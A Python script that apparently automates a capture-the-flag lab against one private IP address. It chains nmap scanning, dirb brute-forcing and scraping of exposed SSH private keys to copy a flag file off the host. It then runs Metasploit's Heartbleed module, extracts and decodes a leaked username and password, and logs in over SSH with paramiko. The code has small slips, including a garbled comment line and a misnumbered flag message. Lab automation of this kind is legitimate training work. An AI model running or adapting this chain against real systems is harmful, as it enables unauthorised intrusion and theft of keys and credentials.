import re,os
import subprocess
import requests
# Example usagimport requests
from bs4 import BeautifulSoup
import re,base64
import paramiko
ip_address = "10.200.32.248"
wordlist = "google-10000-english-no-swears.txt"
output_file = "output.txt"
source_path = "flag3.txt"
destination_path = "/home/ns/flag3.txt"
private_key_path = "ssh_private_keys.txt"
remote_user = "ns"
remote_host = ip_address
filename = "nmap_results.txt"
flag_lsit_file = "flag_list.txt"

def get_the_port():
    print("Using nmap to get ports...")
    cmd = "nmap -p 1-60000 10.200.32.248"
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    stdout_str = stdout.decode()
    port_pattern = r"(\d+)\/(tcp|udp)"  # Pattern to match port number and protocol
    state_pattern = r"\d+\/\w+\s+(open|closed)"  # Pattern to match port state
    ports = re.findall(port_pattern, stdout_str)
    states = re.findall(state_pattern, stdout_str)
    results = {}
    for port, protocol in ports:
        results[port] = "open" if (port, "tcp") in states else "closed"
    for port, state in results.items():
        print(f"Port {port}: {state}")

    with open("nmap_results.txt", "w") as file:
        for port, state in results.items():
            file.write(f"Port {port}: {state}\n")
    print("Results saved to nmap_results.txt file.")



def get_flag_from_url(url):
    flag =""
    try:
        response = requests.get(url)
        print(f"Request to {url} successful.")

        # Parse HTML content using Beautiful Soup
        soup = BeautifulSoup(response.content, 'html.parser')

        # Search for flag in the HTML content
        flag_pattern = r'flag(\d+)\{([^}]*)\}'
        flag_matches = re.findall(flag_pattern, str(soup))
        
        # Print the extracted flags and numbers
        for match in flag_matches:
            flag_number = match[0]
            flag_content = match[1]
            flag = f"Flag{flag_number}{{{flag_content}}}"
            print(flag)
            return flag
    except requests.RequestException as e:
        print(f"Failed to make request to {url}: {e}")
        return flag

def run_dirb(ip_address, port, wordlist, output_file):
    print("runing dirb...")
    command = f"dirb http://{ip_address}:{port} -w {wordlist} -o {output_file}"
    subprocess.run(command, shell=True)

def extract_http_urls_from_file(file_path):
    # Read the contents of the file
    with open(file_path, 'r') as file:
        file_contents = file.read()

    # Define the regex pattern to match HTTP URLs
    pattern = r'\+ (http://\S+/\w+)'
    # Use re.findall to find all matches of the pattern in the file contents
    matches = re.findall(pattern, file_contents)
    
    return matches

def extract_ssh_private_keys(url):
    # Define the regex pattern to match SSH private keys
    # pattern = re.compile(r'-----BEGIN OPENSSH PRIVATE KEY-----(.*?)-----END OPENSSH PRIVATE KEY-----', re.DOTALL)
    pattern = re.compile(r'(-----BEGIN OPENSSH PRIVATE KEY-----.+?-----END OPENSSH PRIVATE KEY-----)', re.DOTALL)
    flag =""
    try:
        response = requests.get(url)
        print(f"Request to {url} successful.")

        # Parse HTML content using Beautiful Soup
        soup = BeautifulSoup(response.content, 'html.parser')

        # Search for flag in the HTML content
        # flag_matches = re.findall(flag_pattern, str(soup))
        
        matches= re.findall(pattern, str(soup))
        print("Private Key Found")
        print(matches[0])
        return matches
        # Print the extracted flags and numbers
    except requests.RequestException as e:
        print(f"Failed to make request to {url}: {e}")
        return flag

    # Use re.findall to find all matches of the pattern in the text
def write_keys_to_file(keys, filename):
    with open(filename, 'w') as file:
        for key in keys:
            file.write(key + '\n')
    os.chmod(filename, 0o600)

def scp_file(source_path, destination_path, private_key_path, remote_user, remote_host):
    #Construct the SCP command
    scp_command = [
        'scp',
        '-i', private_key_path,  # Specify the private key
        f'{remote_user}@{remote_host}:{destination_path}',  # Destination file or directory on the remote host
        source_path             # Source file or directory
    ]

    try:
        subprocess.run(scp_command, check=True)
        print("Flag 3 Downloded")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred: {e}")

def add_flag_to_file(filename,line):
    with open(filename, 'a') as f:
        f.write(line + '\n')


def second_flag():
    run_dirb(ip_address, ip_port, wordlist, output_file)
    discovered_urls = extract_http_urls_from_file(output_file)
    return {"flag":get_flag_from_url(discovered_urls[0]),"url":discovered_urls[0]}
 
def third_flag(result_flag_2):
    keys = extract_ssh_private_keys(result_flag_2.get("url"))
    filename = 'ssh_private_keys.txt'
    write_keys_to_file(keys, filename)
    scp_file(source_path, destination_path, private_key_path, remote_user, remote_host)
    cat_cmd= ['cat' ,source_path]
    cat_resp = subprocess.run(cat_cmd, check=True,capture_output=True,text=True)
    print(cat_resp.stdout)
    add_flag_to_file(flag_lsit_file,cat_resp.stdout)
    print("FLAG 3 SAVED TO flag_list.txt \n")


def fourth_flag():
    bash_script = """
    #!/bin/bash

    if command -v msfconsole &>/dev/null; then
        msfconsole -x "use auxiliary/scanner/ssl/openssl_heartbleed;set RHOSTS 10.200.32.248;set RPORT 5916;set VERBOSE true;run;exit;"
    else
        echo "msfconsole is not installed"
    fi
    """

    process = subprocess.Popen(["bash","-c",bash_script],stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()

    if output:
        out_resp = output.decode()
        start_ind = out_resp.find("username")
        stripted_data = out_resp[start_ind:start_ind+100].split("HTTP")[0]
        user_pass = stripted_data.split('&')
        # print(user_pass)
        user_name = user_pass[0].split("=")[1]
        encoded_password = user_pass[1].split("=",1)[1].strip()


        decoded_password = base64.b64decode(encoded_password)
        decoded_password = base64.b64decode(decoded_password)

        finalPassword = decoded_password.decode('utf-8')

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            client.connect(ip_address, 22, user_name, finalPassword)

            stdin, stdout, stderr = client.exec_command('cd /home/ns && ls')

            # Read and print output
            vmOutput = stdout.read().decode('utf-8')
            files = vmOutput.splitlines()

            for fileName in files:
              print(fileName)
            scp = paramiko.SFTPClient.from_transport(client.get_transport())

            remote_path = "/home/ns/flag4.txt"
            local_path = "./flag4.txt"  
            scp.get(remote_path, local_path)

            print("Flag 3 Downloded")

            cat_cmd= ['cat' ,local_path]
            cat_resp = subprocess.run(cat_cmd, check=True,capture_output=True,text=True)
            print(cat_resp.stdout)
            add_flag_to_file(flag_lsit_file,cat_resp.stdout)
            print("FLAG 4 SAVED TO flag_list.txt \n")

            
            scp.close()
            stdin.close()
            stdout.close()
            stderr.close()

            client.close()

        except paramiko.AuthenticationException:
          print("Authentication failed. Please check your credentials.")
        except paramiko.SSHException as e:
          print("SSH connection failed:", str(e))
        finally:
          print("Completed!")

    if error:
        print("Error:", error.decode())
get_the_port()
try:
    with open(filename, "r") as file:
        lines = file.readlines()
    for line in lines:
        ip_port = line.strip().split(" ")[1].replace(":", "")  # Extract port number
        if(ip_port=="5906"):
            url = f"http://10.200.32.248:{ip_port}"
            result_flag = get_flag_from_url(url)
            if(result_flag):
                add_flag_to_file(flag_lsit_file,result_flag)
                print("FLAG 1 SAVED TO flag_list.txt \n")
            result_flag_2 = second_flag()
            if(result_flag_2.get("flag").find("flag2")):
                add_flag_to_file(flag_lsit_file,result_flag_2.get("flag"))
                print("FLAG 2 SAVED TO flag_list.txt \n")
                third_flag(result_flag_2)
            fourth_flag()
except FileNotFoundError:
    print(f"File '{filename}' not found.")



